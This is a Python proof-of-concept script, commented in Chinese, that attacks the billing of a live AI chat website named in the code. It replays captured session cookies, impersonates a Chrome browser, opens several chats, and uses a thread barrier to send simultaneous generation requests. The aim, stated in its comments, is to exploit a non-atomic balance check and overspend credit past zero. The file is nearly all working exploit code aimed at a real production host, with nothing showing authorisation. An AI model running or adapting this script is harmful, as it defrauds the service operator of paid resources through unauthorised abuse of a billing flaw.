# scripts/poc_race.py —— 并发扣费竞态（线程版，逐请求同步发，复刻可用的 replay_chat 路径）
#
# 用法:
#   python scripts/poc_race.py --k 6  --max-tokens 200
#   python scripts/poc_race.py --k 14 --max-tokens 4000     # 逼超发：总价 > 余额
#
# 判据: credit 变负 / 200 条数 × 单价 > 初始余额 —— 说明余额检查非原子，可超发
import argparse
import glob
import io
import json
import os
import threading
import time
from concurrent.futures import ThreadPoolExecutor

from curl_cffi import requests as creq

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BASE = "https://www.dzmm.ai"
DEFAULT_CARDS = [3821218, 3856159, 3856830, 3858435, 3859027, 3860041, 3860611,
                 3860761, 3861267, 3865272, 3867710]

_lock = threading.Lock()



def with_headers(base, **over):
    """大小写不敏感地合并头，避免同名头重复（重复会被边缘直接 403）"""
    out = dict(base)
    lower = {k.lower(): k for k in out}
    for k, v in over.items():
        old = lower.get(k.lower())
        if old is not None:
            del out[old]
        out[k] = v
    return out


def latest_flow():
    best = None
    for p in glob.glob(os.path.join(ROOT, "captures", "*", "trpc.jsonl")):
        with io.open(p, encoding="utf-8") as f:
            for line in f:
                r = json.loads(line)
                if r["path"].startswith("/api/chat") and r["method"] == "POST":
                    if best is None or r["t"] > best["t"]:
                        best = r
    return best


def base_headers(flow):
    h = {k: v for k, v in flow["req_headers"].items()
         if k.lower() not in ("content-length", "host", "connection")}
    h["cookie"] = "; ".join(flow.get("req_cookies") or [])
    return h


def credit(headers, proxy):
    r = creq.get(BASE + "/api/trpc/user.getMe?batch=1&input=%7B%220%22%3A%7B%22json%22%3Anull%7D%7D",
                 headers={"cookie": headers["cookie"], "referer": BASE + "/"},
                 impersonate="chrome", proxies=proxy, timeout=30)
    try:
        return json.loads(r.text)[0]["result"]["data"]["json"]["credit"]
    except Exception:
        return None


def template_body(flow):
    if flow.get("req_body"):
        return json.loads(flow["req_body"])
    return json.load(io.open(os.path.join(ROOT, "out", "chat_body_exact.json"), encoding="utf-8-sig"))


def make_chat(headers, proxy, card_id):
    r = creq.post(BASE + "/api/trpc/chat.createByCard",
                  data=json.dumps({"json": {"cardId": card_id}}),
                  headers=with_headers(headers, **{"content-type": "application/json", "referer": BASE + "/"}),
                  impersonate="chrome", proxies=proxy, timeout=40)
    try:
        return json.loads(r.text)["result"]["data"]["json"]["chatId"]
    except Exception:
        print("  create fail:", r.status_code, r.text[:110])
        return None


def gen(headers, proxy, tpl, chat_id, model, max_tokens, i, barrier, card_id=None):
    b = json.loads(json.dumps(tpl))
    b["chatId"] = chat_id
    if card_id is not None:
        b["cardId"] = str(card_id)
    b["chatSettings"]["model"] = model
    b["chatSettings"]["maxTokens"] = max_tokens
    b["prompts"] = [{"role": "user", "content": "用一句话说明现在的时间"}]
    b["content"] = b["prompts"][0]["content"]
    b.pop("parentGenerationId", None)
    barrier.wait()  # 同时放行，压测余额检查的原子性
    try:
        r = creq.post(BASE + "/api/chat", data=json.dumps(b, ensure_ascii=False).encode("utf-8"),
                      headers=with_headers(headers, **{"content-type": "application/json",
                                                 "referer": BASE + "/chat?c=" + chat_id}),
                      impersonate="chrome", proxies=proxy, timeout=180)
        txt = r.text or ""
        return i, r.status_code, ('"type":"complete"' in txt), txt[:120]
    except Exception as e:
        return i, "ERR", False, str(e)[:120]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--k", type=int, default=6)
    ap.add_argument("--model", default="nalang-max-0826")
    ap.add_argument("--max-tokens", type=int, default=200)
    ap.add_argument("--proxy", default="http://127.0.0.1:7897")
    ap.add_argument("--cards", default="")
    args = ap.parse_args()

    flow = latest_flow()
    if not flow:
        print("没有 /api/chat 抓包")
        return 2
    proxy = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    headers = base_headers(flow)
    tpl = template_body(flow)
    cards = [int(x) for x in args.cards.split(",")] if args.cards else DEFAULT_CARDS

    c0 = credit(headers, proxy)
    print("credit before:", c0)

    chats = []
    for i in range(args.k):
        cid = make_chat(headers, proxy, cards[i % len(cards)])
        if cid:
            chats.append(cid)
        time.sleep(0.3)
    print("chats:", len(chats), "unique:", len(set(chats)))
    if not chats:
        return 2

    barrier = threading.Barrier(len(chats))
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=len(chats)) as ex:
        futs = [ex.submit(gen, headers, proxy, tpl, cid, args.model, args.max_tokens, i, barrier,
                          cards[i % len(cards)])
                for i, cid in enumerate(chats)]
        results = [f.result() for f in futs]
    print("burst %.1fs" % (time.time() - t0))

    ok = 0
    for i, status, good, head in results:
        ok += 1 if good else 0
        print("  #%d %s complete=%s %s" % (i, status, good, head.replace("\n", " ")[:110]))

    time.sleep(8)
    c1 = credit(headers, proxy)
    delta = None if (c0 is None or c1 is None) else round(c0 - c1, 3)
    print("credit after:", c1, "| delta:", delta, "| ok:", ok, "/", len(chats))
    if c1 is not None and c0 is not None and c1 < 0:
        print(">>> 余额为负：余额检查非原子，可超发")
    with io.open(os.path.join(ROOT, "out", "poc_race.jsonl"), "a", encoding="utf-8") as f:
        f.write(json.dumps({"t": time.time(), "k": len(chats), "ok": ok, "model": args.model,
                            "max_tokens": args.max_tokens, "credit_before": c0,
                            "credit_after": c1}, ensure_ascii=False) + "\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
